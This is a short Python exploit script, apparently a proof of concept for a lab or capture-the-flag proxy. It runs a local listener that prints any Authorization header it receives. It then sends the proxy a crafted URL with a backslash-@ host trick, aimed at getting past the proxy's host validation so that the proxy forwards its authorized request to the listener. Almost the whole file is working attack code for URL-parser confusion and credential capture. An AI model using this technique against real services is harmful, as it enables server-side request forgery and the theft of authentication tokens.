import aiohttp
import aiohttp.web
import asyncio

base_url = "whoami.honeylab.hu"
proxy_url = "http://localhost:1338"


async def handle_request(request):
    authorization = request.headers.get("Authorization")
    if authorization:
        print(f"Authorization Header: {authorization}")

    return aiohttp.web.Response(text="Request Captured")


async def send_http_call():
    async with aiohttp.ClientSession() as session:
        url = f"{proxy_url}/proxy"
        params = {"url": f"http://127.0.0.1:8888\@{base_url}/random"}
        headers = {"X-Playground": "true"}
        async with session.get(url, params=params, headers=headers) as response:
            print(f"HTTP Call to {url} - Status: {response.status}")
            print(await response.text())


async def main():
    app = aiohttp.web.Application()
    app.router.add_route("GET", "/{path:.*}", handle_request)

    runner = aiohttp.web.AppRunner(app)
    await runner.setup()
    site = aiohttp.web.TCPSite(runner, "0.0.0.0", 8888)

    await site.start()

    await send_http_call()


if __name__ == "__main__":
    loop = asyncio.get_event_loop()
    loop.run_until_complete(main())
    loop.run_forever()
